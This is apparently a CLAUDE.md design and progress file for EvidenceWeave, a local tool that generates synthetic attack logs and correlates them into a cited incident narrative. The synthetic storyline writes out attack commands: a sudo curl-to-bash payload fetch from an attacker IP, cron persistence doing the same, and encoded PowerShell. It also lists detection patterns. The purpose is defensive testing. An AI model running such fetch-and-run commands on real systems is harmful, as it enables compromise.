# EvidenceWeave — CLAUDE.md (single source of truth)

## Project overview
- EvidenceWeave is a log-correlation agent that reads mixed log sources (Linux auth.log, nginx/Apache access logs, Windows event logs as JSON).
- It normalizes them into one event schema.
- Deterministic correlation rules detect the attack chain.
- A local LLM (Ollama) writes an incident narrative where every sentence cites event IDs; a verifier checks those citations.
- Output is an HTML report, evaluated against a synthetic answer key.

## Hard constraints
- Completely free and local: Ollama only, no paid APIs.
- Python 3.10+.
- Minimal dependencies (requests, jinja2, pytest).
- Deterministic rules find the attack chain; the LLM only narrates.
- Every narrative claim must cite event IDs.

## Models
- Primary: `qwen2.5:7b-instruct` (override with env `EVIDENCEWEAVE_MODEL`).
- Secondary: `llama3.1:8b` (model comparison).
- Installed but unused: `qwen3-vl:8b-instruct`, `qwen3-vl:8b`. Do not pull any other models.

## Architecture
generator -> parsers -> normalized events -> correlation rules -> narrator -> verifier -> HTML report -> evaluation against the answer key

Package layout: `evidenceweave/{generator,parsers,correlation,narrator,verifier,report}`, plus `cli.py`, `schema.py`, `config.py`.

## Planned event schema
`event_id`, `timestamp` (UTC), `host`, `user`, `src_ip`, `source_type`, `action`, `raw_file`, `raw_line`, `raw_text`

## Attack storyline (implemented in Phase 1)
Attacker IP 203.0.113.45 throughout; compromised user `deploy`; new user `svc_backup`; pivot web01 = 10.0.0.5.
1. brute_force: 25-40 failed SSH passwords on web01 (invalid users, root, deploy)
2. initial_access: `Accepted password for deploy` from the attacker IP
3. privilege_escalation: `sudo ... curl -s http://203.0.113.45:8080/x.sh | bash`
4. persistence: `useradd` new user svc_backup + 4 CRON runs (`(svc_backup) CMD (curl ... b.sh | bash)`) in auth.log
5. lateral_movement (ws-fin01): 3-5x 4625, 4624 type 3 from 10.0.0.5, 4672, 4688 powershell `-Enc`, 4698 `\WindowsUpdateCheck`
6. web_recon: 26 nginx scan requests from the attacker IP (mostly 404, a few 200/403)
Steps 3/4/5 contain the attacker IP via the payload URL (no SSH IP exists on sudo/cron/Windows lines).

## Generator usage and answer key format
```powershell
python -m evidenceweave.cli generate --case case01 --difficulty easy --seed 42 [--out data/cases]
python -m evidenceweave.cli generate --case case02 --difficulty hard --seed 7
```
Output `data/cases/<case>/{logs/{linux_auth.log,nginx_access.log,windows_events.jsonl},answer_key.json,manifest.json}` (data/cases is gitignored; regenerate with the commands above).
`answer_key.json`: `case_name, seed, difficulty, attacker_ip, decoy_ips, compromised_user, created_user, clock_skew_seconds{source:sec}, time_note, steps[], benign_but_suspicious_looking[]`.
Each step: `step_id (1-6), name, description, start_time, end_time` (true UTC, ISO `...Z`), `status` (`complete` | `partially_unprovable`), `evidence[{source_file, line_number (1-based), event_marker}]`, `evidence_missing[{description, source_file, event_marker}]`.
Benign list items: `{source_file, line_number, event_marker, reason}`.
`manifest.json`: `case_name, seed, difficulty, generator_version, assumed_syslog_year (2026), line_counts, clock_skew_seconds`.
Hard mode: ~5x noise, decoy IP 198.51.100.23 (failed SSH + web scans, never succeeds), Windows clock +90s (logged = true + 90), useradd line for svc_backup deleted (step 4 partially unprovable), benign 4720 `temp_intern` and benign 4698 `GoogleUpdateTaskMachineCore`.
Line numbers are computed after merge/sort/deletion. Generator code: `evidenceweave/generator/{formats,attack,noise,key,core}.py`.

## Normalized event schema (Phase 2, `evidenceweave/schema.py`)
`Event` dataclass: `event_id, timestamp (tz-aware UTC, used for sorting), raw_timestamp (as written, UTC), clock_corrected (bool), host, user|None, src_ip|None, dst_ip|None, source_type (auth|nginx|windows), action, raw_file, raw_line (1-based), raw_text (unmodified), extra{}`. `to_dict()/from_dict()` round-trip exactly; timestamps serialize as ISO 8601 with `Z`. Event validates `action` and `source_type` on construction.
- **Event ID**: `AUTH-L<n>` (linux_auth.log), `NGX-L<n>` (nginx_access.log), `WIN-L<n>` (windows_events.jsonl); n = 1-based physical line number (blank lines count toward n).
- **Action taxonomy** (constants + `ACTIONS` in schema.py): ssh_login_failed, ssh_invalid_user, ssh_login_success, session_opened, session_closed, sudo_command, user_created, cron_session_opened, cron_session_closed, cron_command, web_request, win_logon_success, win_logon_failed, win_special_privileges, win_process_created, win_task_created, win_user_created, unparsed.
- **Field conventions**: auth `extra` has `program`, `pid`, plus `port`/`method` (ssh), `command`/`tty`/`pwd`/`target_user` (sudo), `service`/`uid`/`by` (session lines; for sudo sessions `user` is the target user e.g. root and `by` is the invoker), `new_user`/`uid` (useradd), `command` (cron). nginx `extra`: method, path, protocol, status, bytes, referrer, user_agent. windows `extra`: `event_id` + the whole EventData; user = TargetUserName (4624/4625/4720) or SubjectUserName (4672/4688/4698); src_ip = IpAddress unless `-`. `dst_ip` is currently always None.
- **Clock offsets**: never applied automatically. `--clock-offset HOST=SECONDS` = how far that host's clock is AHEAD of true time; `timestamp = raw_timestamp - SECONDS`, `clock_corrected=True` for that host's parsed events. Without the flag timestamp == raw_timestamp. Repeatable.
- **Unparsed**: unmatched lines / unknown EventIDs become `action="unparsed"` (reason in `extra.reason`, raw_text kept, counted). They inherit the previous event's timestamps in the same file (epoch if first) so they sort beside their neighbours. Blank lines are skipped and counted in `stats.blank`.
- **hosts.json** (written by the generator next to answer_key.json): `{"hosts": [{"name","ip","os":"linux|windows","role"}]}`. case: web01 10.0.0.5 linux role=web; ws-fin01 10.0.0.70 windows role=workstation. Optional for parsing; nginx host = first role=="web" host else "web01".
- **Sorting**: (timestamp, source order auth<nginx<windows, raw_line).
- **Parse CLI**: `python -m evidenceweave.cli parse --case-dir data/cases/case02 [--clock-offset ws-fin01=+90] [--year 2026] [--out output]` -> `output/<case>/events.jsonl` + summary. Year defaults to manifest `assumed_syslog_year`. Bad offsets exit 2 with a clear message.
- Code: `evidenceweave/parsers/{common,auth_parser,nginx_parser,windows_parser,pipeline}.py`; `parse_case(case_dir, year=None, clock_offsets=None) -> Case`, `write_events(case, path)`.

## Correlation and attack chain (Phase 3, `evidenceweave/correlation/`)
**Anti-overfitting rule: the analysis never reads `answer_key.json` or manifest attack info and hard-codes no IPs, user names, URLs or file names.** Inputs are only the parsed events, `hosts.json` and CLI options. Only `scripts/check_against_key.py` and tests may read the key (a test greps `correlation/` for "answer_key"/"manifest" and another proves chain.json is byte-identical with the key and manifest deleted). Attacker, compromised user, payload server, pivot host are all DERIVED.
- **Config** (`config.py`, `CorrelationConfig`; every int/float overridable on the CLI as `--field-name`, plus `--tolerance-seconds`): brute_force_min_failures=8, brute_force_window_seconds=600, access_after_failures_window_seconds=1800, web_recon_min_requests=15, web_recon_min_error_ratio=0.6 (403/404 share), web_recon_window_seconds=900, web_recon_min_sensitive_paths=3, cross_host_tolerance_seconds=300, lateral_window_seconds=900, sudo_after_access_window_seconds=1800, cron_session_match_seconds=60, sensitive_path_fragments (/.env /.git /wp-admin /wp-login /phpmyadmin /admin /backup /config /server-status /cgi-bin), suspicious_patterns (compiled regex list `DEFAULT_SUSPICIOUS_PATTERNS`; extend it there).
- **Tolerance semantics**: across different hosts accept `B.start >= A.start - tolerance`; same host is strict. Skew is deliberately not estimated.
- **Finding** (`findings.py`): `finding_id (F-<rule>-<n>, time order), rule, stage (brute_force|initial_access|privilege_escalation|persistence|lateral_movement|web_recon|missing_evidence), status (confirmed|attempts_only|partial|unprovable), start_time, end_time (UTC, corrected timestamps), hosts, entities{ips,users,hosts,urls}, evidence_event_ids (sorted by source,line), summary (template text), details{}`; `to_dict/from_dict`.
- **Rules** (`rules/*.py`, `run(events, cfg, hosts, prior_findings)`; order brute_force, initial_access, privilege_escalation, lateral_movement, persistence, web_recon; unparsed events are skipped and counted): 1 brute_force = >=N failed ssh/4625 from one IP in a sliding window, merged bursts, confirmed only if a success follows (within the access window); 2 initial_access = success from an IP whose brute force ended within the window (windows logons only from non-inventory IPs); 3 privilege_escalation = sudo with a suspicious pattern by a compromised user or with a URL, or any sudo by a compromised user within the post-access window (partial); 4 persistence = (a) user_created after an initial access, (b) suspicious/URL cron commands grouped per (host,user,command) with matching session open/close lines (same pid+user, within 60s), (c) suspicious win_task_created not already explained by lateral movement; plus a missing_evidence/unprovable finding when a cron user was never created in the logs but first appears after the initial access; 5 lateral_movement = win logon type 3/10 whose src IP is an inventory host that has an initial_access/privesc finding, with preceding 4625s from that IP and, for the same user within 900s, 4672 / suspicious 4688 / 4698 (without hosts.json only a candidate with a suspicious process, status partial, details.note explains the missing inventory); 6 web_recon = per IP, >=15 requests with >=60% 403/404 in 15 min, or >=3 distinct sensitive paths; emits attempts_only.
- **Chain** (`chain.py`): seed attacker IPs/users/hosts from initial_access findings, then fixpoint-grow: a finding joins if it shares a payload server (URL origin), IP, a pivot host IP (inventory ip of an attacker host) or a user with the set AND, for post-access stages, passes the time-order check vs the first initial access (cross-host tolerance). Hosts alone never link. Linked web_recon is upgraded to confirmed. Lateral movement without a verified pivot is never linked. `chain.json`: `case_name, generated_by_version, config, applied_clock_offsets, attacker_entities{ips,users,associated_users,hosts,urls}, stages[{stage,status,start_time,end_time,finding_ids,evidence_event_ids,links[{finding_id,reasons}]}], attempts_only_actors, unlinked_findings, unprovable_items, notes, stats`. missing_evidence attaches to its `affects_stage` (persistence) which becomes `partial`. IPs with brute force/recon but no successful access go to `attempts_only_actors` (never in a stage).
- **Usage**: `python -m evidenceweave.cli correlate --case-dir data/cases/case02 [--clock-offset ws-fin01=+90] [--tolerance-seconds 300] [--year 2026] [--out output] [--brute-force-min-failures N ...]` -> `output/<case>/{findings,chain}.json` + summary. Measure: `python scripts/check_against_key.py --case-dir data/cases/case02 [--chain output/case02/chain.json]` (always exit 0).

## Answer-key fix (Phase 4, Part A)
The planted cron job's `pam_unix(cron:session): session closed for user <cron user>` lines are now tagged as step 4 evidence (marker `CRON[<pid>]: pam_unix(cron:session): session closed`), in `generator/attack.py`. Logs, manifest.json and hosts.json are byte-identical to before (hashes asserted in `tests/test_generator.py`); only answer_key.json changed: +4 step-4 evidence items per case (case01 13, case02 12). Correlation precision is now 1.000 / recall 1.000 on both cases.

## Narrator (Phase 4, `evidenceweave/narrator/`)
The LLM only EXPLAINS the Phase 3 chain; it never decides what the attack is, and it never sees the answer key (a test scans all non-generator modules for the string `answer_key`).
- **llm.py**: `LLMClient` Protocol (`model`, `options`, `json_mode`, `complete(system,user)->LLMResult`); `OllamaClient` (requests, `/api/chat`, stream false, `keep_alive` 10m, options temperature 0 / seed 42 / num_ctx 8192 default). Output format = JSON schema `{"sentences":[{"text","cites":[...]}]}`; if the server rejects it, falls back (sticky) to `format:"json"`; `json_mode` is recorded in outputs. Bad/malformed replies return a failure result (never raise); only an unreachable server (`ollama serve`) or missing model (`ollama pull <model>`) raises `LLMError`. `call_json` retries ONCE, only for unparseable replies (same prompt + reminder line).
- **packs.py**: per chain stage a `Pack` (status, times, deterministic finding summaries, entities, integer counts, NOT-PROVABLE notes, evidence lines `ID | timestamp | raw_text<=300 chars`). Evidence capped at `max_evidence_per_stage` (default 12) with a deterministic spread (first, last, evenly spaced; chronological). `allowed_cite_ids` = exactly the IDs shown; `full_evidence_ids` = all stage IDs; omitted counts recorded.
- **prompts.py** (`PROMPT_VERSION = "p4-v1"`, stored in outputs): strict system rules (only given facts, every sentence cites, cite only allowed IDs, never invent, say "not shown", no speculation, 2-5 sentences, copy times/IDs exactly, don't mention instructions); stage prompt; executive-summary prompt (per stage: status, time range, summaries, first/last shown ID); baseline chunk and final prompts.
- **narrate.py** `narrate_chain(case_output_dir, client, config)`: one call per stage chronologically + one executive-summary call; citation problems are NOT repaired (Phase 5). Deterministic template sentences (`source: "template"`) for every `attempts_only_actors` entry ("<IP> made N failed login attempts / web requests between t1 and t2; no successful access from this address was observed", cites first/middle/last) and every `unprovable_items` entry (what could not be proven + indirect evidence, cites first 4). No LLM call for these.
- **baseline.py** `run_baseline(...)`: no rules/chain/key; the sorted events.jsonl is split into consecutive chunks (default 120), each chunk -> LLM notes (same schema, same temperature/seed/model, rules forbidding invention + requiring cites), then one final call turns all notes into a 6-12 sentence chronological narrative. A size guard refuses (before any call) a chunk whose estimated tokens exceed 85% of num_ctx. NOTE: 120-event chunks are ~8-9k tokens, so run the baseline with `--num-ctx 16384`.
- **Outputs** in `output/<case>/`: `narrative.json` (case_name, mode "chain", model, prompt_version, ollama_options, json_mode, total_seconds, created_at, executive_summary + executive_summary_meta, stages[{stage,status,source "llm",sentences,parse_ok,attempts,seconds,evidence_shown,evidence_total,allowed_cite_ids,raw_output_file}], attempts_only, unprovable, stats{calls,failed_parses,retries,total_tokens}); `baseline_narrative.json` (mode "baseline", chunk_size, number_of_chunks, chunks[...], collected_notes, final, sentences, failed_parses, retries, total_seconds, stats); `narrator_raw/<mode>_<model-with-colons-replaced>/<stage|chunk_NNN|final|executive_summary>.txt` holding the exact prompts and every raw reply.
- **CLI**: `python -m evidenceweave.cli narrate --case-dir data/cases/case01 [--mode chain|baseline|both] [--model NAME] [--max-evidence-per-stage 12] [--chunk-size 120] [--num-ctx 8192] [--clock-offset HOST=SECONDS] [--tolerance-seconds 300] [--year 2026] [--out output]`. If chain.json/findings.json/events.jsonl are missing in the output folder (or any of clock-offset/tolerance/year is given) it runs parse + correlate first. Model default: env `EVIDENCEWEAVE_MODEL` or qwen2.5:7b-instruct.

## Phase plan
- [x] Phase 0 Setup
- [x] Phase 1 Synthetic log generator + answer key
- [x] Phase 2 Parsers + normalized schema
- [x] Phase 3 Correlation rules
- [x] Phase 4 LLM narrator with citations (+ naive baseline)
- [ ] Phase 5 Citation verifier + retry loop
- [ ] Phase 6 HTML report + evaluation + demo prep

## Working rules (Claude Code)
- Work on one phase at a time; never start the next phase until the user says so.
- At the end of every phase update this file: tick the phase, add a progress log entry (date, what was built, files created, test results, decisions/problems).
- Keep the "Decisions" and "Open issues" sections current.
- Run tests before finishing a phase.

## Decisions
- venv built from the standard Windows Python 3.12 (`%LOCALAPPDATA%\Programs\Python\Python312`), not the MSYS2 `python` on PATH, which creates a non-standard `.venv/bin` layout without `Scripts\Activate.ps1`.

## Open issues
- (Phase 5 input) Live qwen2.5:7b-instruct output contains defects the verifier must catch: an IP copied wrongly (`203.0113.45` instead of 203.0.113.45), stray junk characters in a sentence, a plain 4624 logon described as a "privileged logon", event IDs written inline in the text as well as in `cites`. Cites were all inside the allowed list this time, but claims are not checked against the cited events.
- The baseline needs `--num-ctx 16384` for 120-event chunks; the chain narrator is run with the same options for a fair comparison.
- Template attempts-only wording only knows failed-login / web-request findings; other actor stages fall back to "N events".
- Persistence evidence includes the cron `session closed` lines (as specified); the key only tags `session opened` + CMD, so check_against_key shows 4 "extra" lines per case (precision 0.67-0.69 on step 4). Genuinely part of the cron run, not a rule gap.
- missing_evidence needs an initial_access finding (a user predating the compromise is never reported missing); with no recorded access nothing is reported.
- Chain linking by user can over-link if a compromised user also has unrelated flagged activity; hosts never link on their own.
- Persistence (a) flags any account created after access (e.g. the benign 4720); it stays out of the chain only because it shares no entity.
- Rules were validated on 8 generated cases (seeds 42, 7, 1, 2, 3 x easy/hard); `burst_spans` tests only the maximal window per start (see its ponytail note).
- Chain timestamps from Windows keep millisecond precision (`...:44.510000Z`), others print whole seconds.
- Syslog year handling is a single fixed year: a log spanning New Year would mis-date January lines (fine for the synthetic cases).
- ws-fin01's IP (10.0.0.70) in hosts.json is invented for the inventory; no log line contains it. Phase 3 still links hosts via the pivot IP 10.0.0.5.
- Unparsed events borrow the previous event's timestamp (an approximation, flagged by action=unparsed).
- Windows evidence in step 5 carries 10.0.0.5 (web01), not the external attacker IP; the attacker IP only appears via the 4698 task URL. Phase 3 rules must link the hosts through the pivot IP.
- Step times in the key are true UTC; Windows skew is NOT auto-corrected (opt-in via --clock-offset). Phase 3 must decide how to obtain the offset (user-supplied) rather than assume it.

## Progress log
### Phase 0 — 2026-10-27
- Built: folder structure, venv, requirements.txt, .gitignore, config.py, schema.py (dataclass placeholder), CLI with placeholder subcommands, scripts/check_ollama.py, smoke tests.
- Files: `evidenceweave/{__init__,cli,schema,config}.py`, subpackage `__init__.py` files, `scripts/check_ollama.py`, `tests/test_smoke.py`, `requirements.txt`, `.gitignore`, `data/.gitkeep`, `CLAUDE.md`.
- check_ollama: qwen2.5:7b-instruct replied in 5.6s, llama3.1:8b in 11.1s (includes model load).
- Tests: see commit; smoke tests pass.

### Phase 1 — 2026-10-27
- Built: seeded generator (easy/hard), answer key + manifest, `generate` CLI command.
- Files: `evidenceweave/generator/{formats,attack,noise,key,core}.py`, `evidenceweave/cli.py` (generate), `tests/test_generator.py`.
- Cases: case01 easy seed 42 (265/426/96 lines, 81 evidence); case02 hard seed 7 (1111/2338/458 lines, 75 evidence, 1 missing).
- Tests: 13 passed (11 generator + 2 smoke).
- Decisions: independent `random.Random(f"{seed}/{part}")` streams; sudo/cron attack lines carry the attacker IP via payload URL; useradd runs in root shell so no sudo line leaks it; evidence_missing items are objects (description + marker) so tests can verify absence; generated cases not committed.
- Problems: first marker for cron session lines matched open+close lines; fixed by including "session opened".

### Phase 2 — 2026-10-27
- Built: normalized `Event` schema + action taxonomy, three parsers with a shared no-silent-drop line loop, `parse_case`/`write_events`, `parse` CLI with `--clock-offset`, generator now also writes `hosts.json`.
- Files: `evidenceweave/schema.py`, `evidenceweave/parsers/{common,auth_parser,nginx_parser,windows_parser,pipeline}.py`, `evidenceweave/cli.py`, `evidenceweave/generator/{formats,core}.py` (hosts.json), `tests/test_parsers.py`.
- Results: case02 (hard) 3907 events, 0 unparsed; with `ws-fin01=+90` step-5 Windows events land on the key's true times (e.g. WIN-L154 raw 02:42:44.510 -> 02:41:14.510; key step 5 starts 02:41:14). Logs, answer_key.json and manifest.json for case01/case02 are byte-identical to pre-change (SHA-256 asserted in tests).
- Tests: 37 passed (24 new parser tests, 11 generator, 2 smoke).
- Decisions: skew is opt-in only; run loop in `parsers/common.py` shared by all parsers; hosts.json carries an extra `role` field so the nginx host can be resolved; ws-fin01 got IP 10.0.0.70 (outside the 10.0.0.10-60 noise range) because the generator never used one.
- Problems: none blocking; Git Bash `/tmp` is not visible to Windows Python (used the scratchpad for ad-hoc checks).

### Phase 3 — 2026-10-27
- Built: `correlation/{config,findings,util,chain,engine}.py`, six rules in `correlation/rules/`, `correlate` CLI, `scripts/check_against_key.py`.
- Files: `evidenceweave/correlation/**`, `evidenceweave/cli.py`, `scripts/check_against_key.py`, `tests/test_correlation.py`.
- Results: case01 and case02 each give all 6 stages in order, attacker 203.0.113.45 / deploy (+ svc_backup associated), recall 1.000 on every step; case02: decoy 198.51.100.23 in attempts_only_actors only, benign 4720/4698 not in the chain, persistence partial with F-persistence-2 (svc_backup creation missing). 6 extra seeds (1,2,3 x easy/hard) all recall >= 0.9 with no decoy or benign lines. With `--clock-offset ws-fin01=+90` only lateral_movement times shift 90s earlier; evidence identical.
- Tests: 68 passed (31 new correlation tests).
- Decisions: rules take the prior findings as a 4th argument (initial_access needs brute_force etc.); lateral_movement runs before persistence so 4698 is not double counted; `associated_users` kept separate from compromised `users` in attacker_entities; no hard-coded names anywhere in `correlation/`.
- Problems: first draft of the skew test used the wrong offset sign; fixed (positive offset = clock fast = events move earlier).

### Phase 4 — 2026-10-27
- Built: answer-key fix (cron session-closed lines tagged as step 4), `narrator/{llm,packs,prompts,narrate,baseline}.py`, `narrate` CLI, `tests/test_narrator.py`.
- Files: `evidenceweave/narrator/**`, `evidenceweave/generator/attack.py`, `evidenceweave/cli.py`, `tests/test_narrator.py`, `tests/test_generator.py` (+2 tests), `tests/test_parsers.py` (key hashes updated).
- Tests: 95 passed (27 new narrator tests, none touch real Ollama).
- Live (qwen2.5:7b-instruct, temperature 0, seed 42, num_ctx 16384, json mode schema): case01 chain 48.5s (7 calls, 0 failed parses, 0 retries, 9,919 tokens); case01 baseline 212.1s (7 chunks + final = 8 calls, 0 failed parses, 0 retries, 100,824 tokens); case02 chain 46.0s (7 calls, 0 failed, 0 retries, 9,895 tokens).
- Decisions: num_ctx 16384 for live runs so the unmodified 120-event baseline chunks fit; retry only for unparseable JSON; template sections never use the LLM; the baseline runs through the same client and retry helper as the chain narrator.
- Problems: first baseline test used chunk sizes too large for the context (the guard caught it); `/tmp` in Git Bash is not visible to Windows Python.

## How to run (Windows PowerShell)
```powershell
.\.venv\Scripts\Activate.ps1        # activate venv
python -m pytest                    # run tests
python -m evidenceweave.cli --help  # run CLI
python scripts\check_ollama.py      # check Ollama + models
python -m evidenceweave.cli correlate --case-dir data\cases\case02
python scripts\check_against_key.py --case-dir data\cases\case02
python -m evidenceweave.cli narrate --case-dir data\cases\case01 --mode both --num-ctx 16384
```

